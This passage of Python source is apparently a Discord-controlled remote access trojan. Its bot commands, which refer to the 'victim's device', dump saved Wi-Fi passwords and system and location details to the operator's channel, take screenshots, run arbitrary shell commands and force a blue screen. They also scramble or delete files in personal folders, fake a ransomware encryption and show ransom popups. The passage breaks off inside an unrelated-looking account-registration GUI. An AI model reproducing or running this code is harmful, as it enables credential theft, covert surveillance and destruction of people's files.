            'http://ip-api.com/json/',
            'https://ipinfo.io/json'
        ]
        for api_url in apis:
            try:
                response = requests.get(api_url, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if 'ipapi.co' in api_url:
                        return {
                            'ip': data.get('ip', 'N/A'),
                            'country': data.get('country_name', 'N/A'),
                            'region': data.get('region', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'isp': data.get('org', 'N/A')
                        }
                    elif 'ip-api.com' in api_url:
                        return {
                            'ip': data.get('query', 'N/A'),
                            'country': data.get('country', 'N/A'),
                            'region': data.get('regionName', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'isp': data.get('isp', 'N/A')
                        }
                    elif 'ipinfo.io' in api_url:
                        return {
                            'ip': data.get('ip', 'N/A'),
                            'country': data.get('country', 'N/A'),
                            'region': data.get('region', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'isp': data.get('org', 'N/A')
                        }
            except:
                continue
        return {
            'ip': get_local_ip(),
            'country': 'N/A',
            'region': 'N/A',
            'city': 'N/A',
            'isp': 'N/A'
        }
    except:
        return {
            'ip': get_local_ip(),
            'country': 'N/A',
            'region': 'N/A',
            'city': 'N/A',
            'isp': 'N/A'
        }

def get_macaddress():
    try:
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        return mac
    except:
        return "N/A"

def get_wifipasswords():
    profiles = []
    try:
        if platform.system() == "Windows":
            cmd = 'netsh wlan show profiles'
            networks = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
            profile_names = re.findall(r'All User Profile\s*:\s*(.*)', networks)
            for name in profile_names:
                name = name.strip()
                try:
                    cmd = f'netsh wlan show profile "{name}" key=clear' 
                    profile_info = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
                    password_match = re.search(r'Key Content\s*:\s*(.*)', profile_info)
                    password = password_match.group(1).strip() if password_match else "N/A"
                    profiles.append({'name': name, 'password': password})
                except:
                    profiles.append({'name': name, 'password': "N/A"})
        else:
            profiles.append({'name': 'Not supported on this OS', 'password': 'N/A'})
    except:
        profiles.append({'name': 'Error retrieving WiFi', 'password': 'N/A'})
    return profiles

def is_authorized():
    async def auth(ctx):
        if ctx.author.id in Config.WHITELISTED:
            return True
        embed = discord.Embed(
            title="Access Denied",
            description="You're not authorized to use this.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return False
    return commands.check(auth)

@bot.event
async def on_ready():
    await bot.get_channel(Config.MAIN_CHANNEL).send(f"<@{Config.WHITELISTED[0]}>")
    user = get_displayname()
    embed = discord.Embed(
        title="Bot Online",
        description=f"The command prefix is: `{Config.PREFIX}`, try the command `{Config.PREFIX}help`. \nUser: **`{user}`**",
        color=discord.Color.green()
    )
    await bot.get_channel(Config.MAIN_CHANNEL).send(embed=embed)

async def send_embed(ctx, title, description, color=discord.Color.blue()):
    embed = discord.Embed(
        title=title,
        description=description,
        color=color
    )
    await ctx.send(embed=embed)

@bot.command(name='info')
@is_authorized()
async def system_info(ctx):
    try:
        embed = discord.Embed(
            title="Collecting system information",
            description="This may take a while depending on the victim's device.",
            color=discord.Color.blue()
        )
        await ctx.send(embed=embed)
        display_name = get_displayname()
        hwid = get_hwid()
        cpu_info = get_cpuinfo()
        gpu_info = get_gpuinfo()
        ram_info = get_raminfo()
        disks = get_disks()
        ip_info = get_ipinfo()
        mac_address = get_macaddress()
        wifi_profiles = get_wifipasswords()
        embed = discord.Embed(
            title="System Information",
            color=discord.Color.blue()
        )
        embed.add_field(name="Display Name", value=f"```{display_name}```", inline=False)
        embed.add_field(name="Hardware ID", value=f"```{hwid}```", inline=False)
        embed.add_field(name="CPU", value=f"```{cpu_info}```", inline=False)
        embed.add_field(name="GPU", value=f"```{gpu_info}```", inline=False)
        memory = psutil.virtual_memory()
        cpu_percent = psutil.cpu_percent(interval=1)
        embed.add_field(name="RAM", value=f"```{ram_info} ({memory.percent}% used)```", inline=False)
        embed.add_field(name="CPU Usage", value=f"```{cpu_percent}%```", inline=True)
        disk_str = ""
        for disk in disks[:3]:
            disk_str += f"{disk['drive']}: {disk['free']}GB free / {disk['total']}GB total ({disk['percent']}% used)\n"
        embed.add_field(name="Disks", value=f"```{disk_str}```", inline=False)
        embed.add_field(name="Public IP", value=f"```{ip_info['ip']}```", inline=False)
        embed.add_field(name="Location", value=f"```{ip_info['city']}, {ip_info['region']}, {ip_info['country']}```", inline=False)
        embed.add_field(name="ISP", value=f"```{ip_info['isp']}```", inline=False)
        embed.add_field(name="MAC Address", value=f"```{mac_address}```", inline=False)
        embed.add_field(name="Local IP", value=f"```{get_local_ip()}```", inline=True)
        embed.add_field(name="OS", value=f"```{platform.system()} {platform.release()}```", inline=True)
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        embed.add_field(name="Boot Time", value=f"```{boot_time.strftime('%Y-%m-%d %H:%M:%S')}```", inline=True)
        embed.add_field(name="Processes", value=f"```{len(psutil.pids())}```", inline=True)
        if wifi_profiles:
            wifi_str = ""
            for wifi in wifi_profiles[:5]:
                wifi_str += f"{wifi['name']}: {wifi['password']}\n"
            embed.add_field(name="WiFi Profiles", value=f"```{wifi_str}```", inline=False)
            if len(wifi_profiles) > 5:
                embed.add_field(name="More WiFi", value=f"```...and {len(wifi_profiles)-5} more profiles```", inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Info Error", f"Failed to get system info: {str(e)}", discord.Color.red())

@bot.command(name='lock')
@is_authorized()
async def lock_pc(ctx):
    try:
        ctypes.windll.user32.LockWorkStation()
        await send_embed(ctx, "PC Locked", "Workstation has been locked.", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", f"Failed to lock PC: {str(e)}", discord.Color.red())

@bot.command(name='crash')
@is_authorized()
async def blue_screen(ctx):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        await send_embed(ctx, "BSOD Initiated", "Blue screen of death triggered!", discord.Color.dark_red())
    except:
        await send_embed(ctx, "BSOD Failed", "Could not trigger blue screen.", discord.Color.red())

@bot.command(name='rickroll')
@is_authorized()
async def rick_roll(ctx):
    try:
        subprocess.Popen(f'start chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ', shell=True)
        await send_embed(ctx, "Rickroll Activated", "Never gonna give you up, never gonna let you down...", discord.Color.gold())
    except Exception as e:
        await send_embed(ctx, "Error", f"Failed to open rickroll: {str(e)}", discord.Color.red())

@bot.command(name='filescramble')
@is_authorized()
async def file_scramble(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        scrambled = 0
        await send_embed(ctx, "File Scramble Started", "Renaming files in personal folders...", discord.Color.purple())
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            old_path = os.path.join(root, file)
                            ext = os.path.splitext(file)[1]
                            new_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ext
                            new_path = os.path.join(root, new_name)
                            os.rename(old_path, new_path)
                            scrambled += 1
                        except:
                            pass
        await send_embed(ctx, "File Scramble Complete", f"Successfully scrambled **{scrambled}** files across all personal folders!", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Scramble Error", f"Failed to scramble files: {str(e)}", discord.Color.red())

@bot.command(name='filedestroy')
@is_authorized()
async def file_destroy(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        deleted = 0
        await send_embed(ctx, "File Destruction Started", "Deleting files in personal folders...", discord.Color.dark_red())
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            os.remove(file_path)
                            deleted += 1
                        except:
                            pass
        await send_embed(ctx, "File Destruction Complete", f"Successfully deleted **{deleted}** files across all personal folders!", discord.Color.dark_red())
    except Exception as e:
        await send_embed(ctx, "Destruction Error", f"Failed to delete files: {str(e)}", discord.Color.red())

@bot.command(name='fileransom')
@is_authorized()
async def file_ransom(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        encrypted = 0
        await send_embed(ctx, "Ransomware Started", "Encrypting files in personal folders...", discord.Color.dark_purple())
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            with open(file_path, 'rb') as f:
                                data = f.read()
                            encrypted_data = base64.b64encode(data)
                            with open(file_path + '.ENCRYPTED', 'wb') as f:
                                f.write(encrypted_data)
                            os.remove(file_path)
                            encrypted += 1
                        except:
                            pass
        await send_embed(ctx, "Ransomware Complete", f"Successfully encrypted **{encrypted}** files!", discord.Color.dark_purple())
    except Exception as e:
        await send_embed(ctx, "Ransomware Error", f"Failed to encrypt files: {str(e)}", discord.Color.red())

@bot.command(name='virus')
@is_authorized()
async def virus_message(ctx):
    try:
        await send_embed(ctx, "Virus Alert", "Displaying fake virus messages on screen", discord.Color.red())
        for x in range(0, 10):
            msg = "WARNING! This device is filled with viruses. If you would like to get rid of it, pay $234,324,214 in crypto and we will remove it. You have 24 hours to pay before all your devices content is deleted. Don't even try find or delete the virus, or save your files (they are encrypted) otherwise the auto destroy will activate. Have fun :)"
            subprocess.run(f"""PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('{msg}')" """, shell=True, capture_output=True, text=True)
    except Exception as e:
        await send_embed(ctx, "Virus Error", f"Failed to display virus messages: {str(e)}", discord.Color.red())

@bot.command(name='voice')
@is_authorized()
async def voice_message(ctx, *, message: str):
    try:
        engine = pyttsx3.init()
        engine.say(message)
        engine.runAndWait()
        await send_embed(ctx, "Voice Message", f"Text-to-speech said: **{message}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Voice Error", f"Failed to speak message: {str(e)}", discord.Color.red())

@bot.command(name='msgbox')
@is_authorized()
async def msg_box(ctx, *, message: str):
    try:
        subprocess.run(f"""PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('{message}')" """, shell=True, capture_output=True, text=True)
        await send_embed(ctx, "Message Box", f"Displayed message box with text: **{message}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Message Error", f"Failed to display message box: {str(e)}", discord.Color.red())

@bot.command(name='screenshot')
@is_authorized()
async def take_screenshot(ctx, name: Optional[str] = None):
    try:
        filename = name if name else f"screenshot_{int(time.time())}.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        with open(filename, 'rb') as f:
            picture = discord.File(f)
        embed = discord.Embed(
            title="Screenshot Captured",
            description=f"Successfully captured screenshot: **{filename}**",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
        await ctx.send(file=picture)
        os.remove(filename)
    except Exception as e:
        embed = discord.Embed(
            title="Screenshot Error",
            description=f"Failed to take screenshot: {str(e)}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command(name='open')
@is_authorized()
async def open_application(ctx, *, app_name: str):
    try:
        app_map = {
            'notepad': 'notepad.exe',
            'calculator': 'calc.exe',
            'chrome': 'chrome.exe',
            'firefox': 'firefox.exe',
            'explorer': 'explorer.exe',
            'cmd': 'cmd.exe',
            'vscode': 'code.exe',
            'discord': 'discord.exe',
            'spotify': 'spotify.exe',
        }
        app_to_open = app_map.get(app_name.lower(), app_name)
        subprocess.Popen(app_to_open, shell=True)
        await send_embed(ctx, "Application Opened", f"Successfully opened: **{app_name}**", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Open Error", f"Failed to open application: {str(e)}", discord.Color.red())

@bot.command(name='close')
@is_authorized()
async def close_application(ctx, *, app_name: str):
    try:
        closed = False
        for proc in psutil.process_iter(['pid', 'name']):
            if app_name.lower() in proc.info['name'].lower():
                proc.terminate()
                closed = True
        if closed:
            await send_embed(ctx, "Application Closed", f"Successfully closed: **{app_name}**", discord.Color.green())
        else:
            await send_embed(ctx, "Close Failed", f"No process found with name containing: **{app_name}**", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Close Error", f"Failed to close application: {str(e)}", discord.Color.red())

@bot.command(name='listapps')
@is_authorized()
async def list_applications(ctx, limit: int = 15):
    try:
        windows = gw.getAllTitles()
        active_windows = [win for win in windows if win]
        embed = discord.Embed(
            title="Running Applications",
            description=f"Showing **{min(limit, len(active_windows))}** of **{len(active_windows)}** total windows",
            color=discord.Color.green()
        )
        for i, window in enumerate(active_windows[:limit]):
            embed.add_field(name=f"#{i+1} - {window[:50]}", value="\u200b", inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "List Apps Error", f"Failed to list applications: {str(e)}", discord.Color.red())

@bot.command(name='click')
@is_authorized()
async def mouse_click(ctx, button: str = 'left'):
    try:
        button = button.lower()
        if button == 'left':
            pyautogui.click()
            await send_embed(ctx, "Mouse Click", f"Successfully performed **left** click", discord.Color.blue())
        elif button == 'right':
            pyautogui.rightClick()
            await send_embed(ctx, "Mouse Click", f"Successfully performed **right** click", discord.Color.blue())
        elif button == 'middle':
            pyautogui.middleClick()
            await send_embed(ctx, "Mouse Click", f"Successfully performed **middle** click", discord.Color.blue())
        else:
            await send_embed(ctx, "Invalid Button", "Use: **left**, **right**, or **middle**", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Click Error", f"Failed to click: {str(e)}", discord.Color.red())

@bot.command(name='press')
@is_authorized()
async def press_key(ctx, *, key_combo: str):
    try:
        pyautogui.hotkey(*key_combo.split('+'))
        await send_embed(ctx, "Keys Pressed", f"Successfully pressed: **{key_combo}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Press Error", f"Failed to press keys: {str(e)}", discord.Color.red())

@bot.command(name='shutdown')
@is_authorized()
async def shutdown_pc(ctx, delay: int = 60):
    try:
        if delay < 10:
            await send_embed(ctx, "Safety Violation", "Delay must be at least **10 seconds** for safety", discord.Color.orange())
            return
        await send_embed(ctx, "Shutdown Initiated", f"PC will shutdown in **{delay}** seconds", discord.Color.red())
        await asyncio.sleep(delay - 5)
        await send_embed(ctx, "Final Warning", "Shutting down in **5 seconds**...", discord.Color.dark_red())
        await asyncio.sleep(5)
        os.system('shutdown /s /f /t 0')
    except Exception as e:
        await send_embed(ctx, "Shutdown Error", f"Failed to shutdown: {str(e)}", discord.Color.red())

@bot.command(name='restart')
@is_authorized()
async def restart_pc(ctx, delay: int = 60):
    try:
        if delay < 10:
            await send_embed(ctx, "Safety Violation", "Delay must be at least **10 seconds** for safety", discord.Color.orange())
            return
        await send_embed(ctx, "Restart Initiated", f"PC will restart in **{delay}** seconds", discord.Color.orange())
        await asyncio.sleep(delay - 5)
        await send_embed(ctx, "Final Warning", "Restarting in **5 seconds**...", discord.Color.dark_orange())
        await asyncio.sleep(5)
        os.system('shutdown /r /f /t 0')
    except Exception as e:
        await send_embed(ctx, "Restart Error", f"Failed to restart: {str(e)}", discord.Color.red())

@bot.command(name='playpause')
@is_authorized()
async def media_play_pause(ctx):
    try:
        pyautogui.press('playpause')
        await send_embed(ctx, "Media Control", "Successfully toggled **play/pause**", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", f"Failed to control media: {str(e)}", discord.Color.red())

@bot.command(name='nexttrack')
@is_authorized()
async def media_next(ctx):
    try:
        pyautogui.press('nexttrack')
        await send_embed(ctx, "Media Control", "Successfully skipped to **next track**", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", f"Failed to control media: {str(e)}", discord.Color.red())

@bot.command(name='listfiles')
@is_authorized()
async def list_files(ctx, directory: str = "."):
    try:
        files = os.listdir(directory)
        embed = discord.Embed(
            title=f"Files in {directory}",
            color=discord.Color.blue()
        )
        file_list = []
        for file in files[:20]:
            file_path = os.path.join(directory, file)
            if os.path.isdir(file_path):
                file_list.append(f"**{file}/**")
            else:
                file_list.append(f"**{file}**")
        embed.description = "\n".join(file_list)
        if len(files) > 20:
            embed.set_footer(text=f"And {len(files) - 20} more files...")
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "List Files Error", f"Failed to list files: {str(e)}", discord.Color.red())

@bot.command(name='cmd')
@is_authorized()
async def run_cmd(ctx, *, command: str):
    try:
        await send_embed(ctx, "Command Executing", f"Running command: **{command}**", discord.Color.dark_grey())
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        if len(output) > 1900:
            output = output[:1900] + "..."
        embed = discord.Embed(
            title="Command Output",
            description=f"```\n{output}\n```",
            color=discord.Color.dark_grey()
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Command Error", f"Failed to run command: {str(e)}", discord.Color.red())

# ========== HHH GUI COMMAND ==========
@bot.command(name='hhh')
@is_authorized()
async def open_hhh_gui(ctx):
    """Open HHH Image Login Tool GUI on the victim's machine"""
    try:
        def run_gui():
            try:
                # Import required modules for HHH GUI
                from dataclasses import dataclass
                
                # Re-create MainApp class (the full HHH GUI)
                class HHHAutoRegisterApp(tk.Tk):
                    def __init__(self):
                        super().__init__()
                        self.title("AOV REGISTER CENTER")
                        self.geometry("1480x900")
                        self.minsize(1260, 780)
                        self.configure(bg=THEME["bg"])
                        self.config_data = load_config()
                        self.template_store = TemplateStore()
                        self.devices = []
                        self.device_display_names = {}
                        self.imported_accounts = []
                        self.invalid_accounts = []
                        self.success_accounts = []
                        self.failed_accounts = []
                        self.account_file_name = "-"
                        self.current_account_text = "-"
                        self.current_step_key = ""
                        self.current_step_text = "-"
                        self.license_active = True
                        self.running = False
                        self.run_started_at = None
                        self.ui_queue = queue.Queue()
                        self.log_entries = []
                        self.current_filter = "all"
                        self.stop_event = threading.Event()
                        self.pause_event = threading.Event()
                        self.stop_after_current_event = threading.Event()
                        self.runner_thread = None
                        self.scanner_screen = None
                        self.scanner_scale = 1.0
                        self.scanner_photo = None
                        self.scanner_start = None
                        self.scanner_rect_id = None
                        self.scanner_display_size = (0, 0)
                        self.scanner_selection = None
                        self.active_role = next(iter(IMAGE_TEMPLATE_ROLES))
                        self.action_status_vars = {}
                        self.action_status_labels = {}
                        self.action_point_state = {}
                        self.workflow_rows = {}
                        self.workflow_state = {key: "pending" for key, _title, _hint in REGISTRATION_WORKFLOW}
                        self.workflow_hints = {key: hint for key, _title, hint in REGISTRATION_WORKFLOW}
                        self._build_styles()
                        self._build_ui()
                        self._load_config_to_ui()
                        self.refresh_action_points()
                        self.update_dashboard_state()
                        self.after(120, self.drain_ui_queue)
                        self.after(1000, self.update_runtime)
                    
                    def _build_styles(self):
                        self.style = ttk.Style(self)
                        self.style.theme_use("clam")
                        self.style.configure("Cyber.Horizontal.TProgressbar", troughcolor=THEME["panel_soft"], background=THEME["green"], bordercolor=THEME["panel_soft"], lightcolor=THEME["green"], darkcolor=THEME["green"])
                    
                    def _button(self, parent, text, command, kind="secondary", width=None):
                        palette = {"primary": (THEME["button"], THEME["text"]), "danger": (THEME["red"], "#17040a"), "success": (THEME["green"], "#021107"), "warning": (THEME["yellow"], "#151100"), "secondary": (THEME["panel_soft"], THEME["text"]), "ghost": (THEME["panel"], THEME["muted"])}
                        bg, fg = palette.get(kind, palette["secondary"])
                        return tk.Button(parent, text=text, command=command, bg=bg, fg=fg, activebackground=THEME["purple"], activeforeground=THEME["text"], disabledforeground="#66788f", relief=tk.FLAT, bd=0, padx=12, pady=7, cursor="hand2", font=("Segoe UI", 9, "bold"), width=width or 0)
                    
                    def _card(self, parent, title):
                        outer = tk.Frame(parent, bg=THEME["panel"], highlightbackground=THEME["line"], highlightthickness=1, bd=0)
                        header = tk.Frame(outer, bg=THEME["panel"])
                        header.pack(fill=tk.X, padx=14, pady=(12, 5))
                        tk.Label(header, text=title, bg=THEME["panel"], fg=THEME["text"], font=("Segoe UI", 12, "bold")).pack(side=tk.LEFT)
                        body = tk.Frame(outer, bg=THEME["panel"])
                        body.pack(fill=tk.BOTH, expand=True, padx=14, pady=(0, 14))
                        body.outer = outer
                        return body
                    
                    def _metric(self, parent, label, var, row, col):
                        box = tk.Frame(parent, bg=THEME["panel_alt"], highlightbackground=THEME["line"], highlightthickness=1)
                        box.grid(row=row, column=col, sticky="ew", padx=4, pady=4)
                        tk.Label(box, text=label, bg=THEME["panel_alt"], fg=THEME["muted"], font=("Segoe UI", 8)).pack(anchor="w", padx=9, pady=(7, 0))
                        tk.Label(box, textvariable=var, bg=THEME["panel_alt"], fg=THEME["cyan"], font=("Segoe UI", 15, "bold")).pack(anchor="w", padx=9, pady=(0, 7))
                    
                    def _build_ui(self):
                        self.columnconfigure(0, weight=1)
                        self.rowconfigure(2, weight=1)
                        self._build_topbar()
                        self._build_hero_status()
                        self._build_content()
                        self._build_bottom_bar()
                    
                    def _build_topbar(self):
                        top = tk.Frame(self, bg=THEME["bg"], height=84)
                        top.grid(row=0, column=0, sticky="ew", padx=18, pady=(14, 8))
                        top.columnconfigure(1, weight=1)
                        logo = tk.Canvas(top, width=58, height=58, bg=THEME["bg"], highlightthickness=0)
                        logo.grid(row=0, column=0, rowspan=2, sticky="w", padx=(0, 14))
                        logo.create_oval(5, 5, 53, 53, outline=THEME["cyan"], width=2)
                        logo.create_polygon(29, 8, 50, 47, 8, 47, outline=THEME["purple"], fill="", width=2)
                        logo.create_text(29, 34, text="R", fill=THEME["green"], font=("Segoe UI", 16, "bold"))
                        tk.Label(top, text="AOV REGISTER CENTER", bg=THEME["bg"], fg=THEME["text"], font=("Segoe UI", 24, "bold")).grid(row=0, column=1, sticky="sw")
                        tk.Label(top, text="Smart Account Registration Dashboard", bg=THEME["bg"], fg=THEME["cyan"], font=("Segoe UI", 11)).grid(row=1, column=1, sticky="nw")
                        right = tk.Frame(top, bg=THEME["bg"])
                        right.grid(row=0, column=2, rowspan=2, sticky="e")
                        self.license_badge_var = tk.StringVar(value="License Active")
                        self.license_badge = tk.Label(right, textvariable=self.license_badge_var, bg=THEME["green"], fg="#021107", padx=12, pady=5, font=("Segoe UI", 10, "bold"))
                        self.license_badge.pack(side=tk.LEFT, padx=(0, 10))
                        tk.Label(right, text=f"Version {APP_VERSION}", bg=THEME["bg"], fg=THEME["muted"], font=("Segoe UI", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))
                        self._button(right, "Đăng xuất key", self.logout_license, "ghost").pack(side=tk.LEFT)
                    
                    def _build_hero_status(self):
                        hero = tk.Frame(self, bg=THEME["panel_alt"], highlightbackground=THEME["cyan"], highlightthickness=1)
                        hero.grid(row=1, column=0, sticky="ew", padx=18, pady=(0, 12))
                        hero.columnconfigure(0, weight=1)
                        left = tk.Frame(hero, bg=THEME["panel_alt"])
                        left.grid(row=0, column=0, sticky="ew", padx=18, pady=16)
                        self.hero_status_var = tk.StringVar(value="CHƯA SẴN SÀNG")
                        self.hero_steps_var = tk.StringVar(value="0/15 mốc đã chuẩn bị")
                        self.hero_reason_var = tk.StringVar(value="Bạn cần import file dữ liệu, tìm thiết bị và chọn đủ mốc thao tác trước.")
                        tk.Label(left, textvariable=self.hero_status_var, bg=THEME["panel_alt"], fg=THEME["green"], font=("Segoe UI", 25, "bold")).pack(anchor="w")
                        tk.Label(left, textvariable=self.hero_steps_var, bg=THEME["panel_alt"], fg=THEME["cyan"], font=("Segoe UI", 11, "bold")).pack(anchor="w", pady=(2, 5))
                        tk.Label(left, textvariable=self.hero_reason_var, bg=THEME["panel_alt"], fg=THEME["muted"], font=("Segoe UI", 10), wraplength=760, justify=tk.LEFT).pack(anchor="w")
                        self.hero_progress = ttk.Progressbar(left, style="Cyber.Horizontal.TProgressbar", maximum=len(IMAGE_TEMPLATE_ROLES), value=0)
                        self.hero_progress.pack(fill=tk.X, pady=(12, 0))
                        actions = tk.Frame(hero, bg=THEME["panel_alt"])
                        actions.grid(row=0, column=1, sticky="e", padx=18, pady=16)
                        self.start_button = self._button(actions, "BẮT ĐẦU ĐĂNG KÍ", self.start_runner, "primary", width=26)
                        self.start_button.grid(row=0, column=0, columnspan=3, sticky="ew", pady=(0, 8))
                        self.pause_button = self._button(actions, "Tạm dừng", self.toggle_pause, "secondary", width=12)
                        self.pause_button.grid(row=1, column=0, sticky="ew", padx=(0, 5))
                        self.stop_after_button = self._button(actions, "Dừng sau tài khoản hiện tại", self.stop_after_current, "warning", width=21)
                        self.stop_after_button.grid(row=1, column=1, sticky="ew", padx=5)
                        self.stop_now_button = self._button(actions, "Dừng ngay", self.stop_runner, "danger", width=12)
                        self.stop_now_button.grid(row=1, column=2, sticky="ew", padx=(5, 0))
                        self.pause_button.configure(state=tk.DISABLED)
                        self.stop_after_button.configure(state=tk.DISABLED)
                        self.stop_now_button.configure(state=tk.DISABLED)
                    
                    def _build_content(self):
                        shell = tk.Frame(self, bg=THEME["bg"])
                        shell.grid(row=2, column=0, sticky="nsew", padx=18)
                        shell.columnconfigure(0, weight=1)
                        shell.rowconfigure(0, weight=1)
                        self.content_canvas = tk.Canvas(shell, bg=THEME["bg"], highlightthickness=0, bd=0)
                        self.content_canvas.grid(row=0, column=0, sticky="nsew")
                        yscroll = ttk.Scrollbar(shell, orient=tk.VERTICAL, command=self.content_canvas.yview)
                        yscroll.grid(row=0, column=1, sticky="ns")
                        xscroll = ttk.Scrollbar(shell, orient=tk.HORIZONTAL, command=self.content_canvas.xview)
                        xscroll.grid(row=1, column=0, sticky="ew")
                        self.content_canvas.configure(yscrollcommand=yscroll.set, xscrollcommand=xscroll.set)
                        content = tk.Frame(self.content_canvas, bg=THEME["bg"])
                        self.content_window = self.content_canvas.create_window((0, 0), window=content, anchor=tk.NW)
                        content.bind("<Configure>", self.on_content_configure)
                        self.content_canvas.bind("<Configure>", self.on_content_canvas_configure)
                        self.content_canvas.bind_all("<MouseWheel>", self.on_mousewheel)
                        self.content_canvas.bind_all("<Shift-MouseWheel>", self.on_shift_mousewheel)
                        self.content_canvas.bind_all("<Button-4>", self.on_mousewheel)
                        self.content_canvas.bind_all("<Button-5>", self.on_mousewheel)
                        content.configure(width=1220)
                        content.columnconfigure(0, weight=11, uniform="main")
                        content.columnconfigure(1, weight=16, uniform="main")
                        content.columnconfigure(2, weight=13, uniform="main")
                        content.rowconfigure(0, weight=1)
                        left = tk.Frame(content, bg=THEME["bg"])
                        left.grid(row=0, column=0, sticky="nsew", padx=(0, 10))
                        left.columnconfigure(0, weight=1)
                        left.rowconfigure(1, weight=1)
                        workflow = self._card(left, "Quy trình đăng kí")
                        workflow.outer.grid(row=0, column=0, sticky="ew", pady=(0, 10))
                        self._build_workflow_panel(workflow)
                        data = self._card(left, "Dữ liệu đăng kí")
                        data.outer.grid(row=1, column=0, sticky="nsew", pady=(0, 10))
                        self._build_data_panel(data)
                        settings = self._card(left, "Cài đặt nhận diện")
                        settings.outer.grid(row=2, column=0, sticky="ew")
                        self._build_settings_panel(settings)
                        action = self._card(content, "Mốc thao tác")
                        action.outer.grid(row=0, column=1, sticky="nsew", padx=(0, 10))
                        self._build_action_point_panel(action)
                        right = tk.Frame(content, bg=THEME["bg"])
                        right.grid(row=0, column=2, sticky="nsew")
                        right.columnconfigure(0, weight=1)
                        right.rowconfigure(2, weight=1)
                        device = self._card(right, "Kết nối thiết bị")
                        device.outer.grid(row=0, column=0, sticky="ew", pady=(0, 10))
                        self._build_device_panel(device)
                        result = self._card(right, "Kết quả đăng kí")
                        result.outer.grid(row=1, column=0, sticky="ew", pady=(0, 10))
                        self._build_result_panel(result)
                        activity = self._card(right, "Nhật ký hoạt động")
                        activity.outer.grid(row=2, column=0, sticky="nsew")
                        self._build_activity_panel(activity)
                    
                    def on_content_configure(self, _event):
                        bbox = self.content_canvas.bbox("all")
                        if bbox:
                            self.content_canvas.configure(scrollregion=bbox)
                    
                    def on_content_canvas_configure(self, event):
                        width = max(int(event.width), 1220)
                        self.content_canvas.itemconfigure(self.content_window, width=width)
                    
                    def on_mousewheel(self, event):
                        if not hasattr(self, "content_canvas"):
                            return
                        if getattr(event, "num", None) == 4:
                            delta = -3
                        elif getattr(event, "num", None) == 5:
                            delta = 3
                        else:
                            delta = -1 * int(event.delta / 120)
                        self.content_canvas.yview_scroll(delta, "units")
                    
                    def on_shift_mousewheel(self, event):
                        if not hasattr(self, "content_canvas"):
                            return
                        delta = -1 * int(event.delta / 120)
                        self.content_canvas.xview_scroll(delta, "units")
                    
                    def _build_workflow_panel(self, parent):
                        for index, (key, title, hint) in enumerate(REGISTRATION_WORKFLOW, start=1):
                            row = tk.Frame(parent, bg=THEME["panel_alt"], highlightbackground=THEME["line"], highlightthickness=1)
                            row.pack(fill=tk.X, pady=3)
                            row.columnconfigure(1, weight=1)
                            icon = tk.Label(row, text=str(index), bg=THEME["panel_alt"], fg=THEME["cyan"], width=3, font=("Segoe UI", 11, "bold"))
                            icon.grid(row=0, column=0, rowspan=2, sticky="nsw", padx=(8, 8), pady=8)
                            title_label = tk.Label(row, text=title, bg=THEME["panel_alt"], fg=THEME["text"], font=("Segoe UI", 10, "bold"))
                            title_label.grid(row=0, column=1, sticky="w", pady=(7, 0))
                            hint_label = tk.Label(row, text=hint, bg=THEME["panel_alt"], fg=THEME["muted"], font=("Segoe UI", 8), wraplength=330, justify=tk.LEFT)
                            hint_label.grid(row=1, column=1, sticky="w", pady=(0, 7))
                            self.workflow_rows[key] = {"frame": row, "icon": icon, "title": title_label, "hint": hint_label}
                    
                    def _build_data_panel(self, parent):
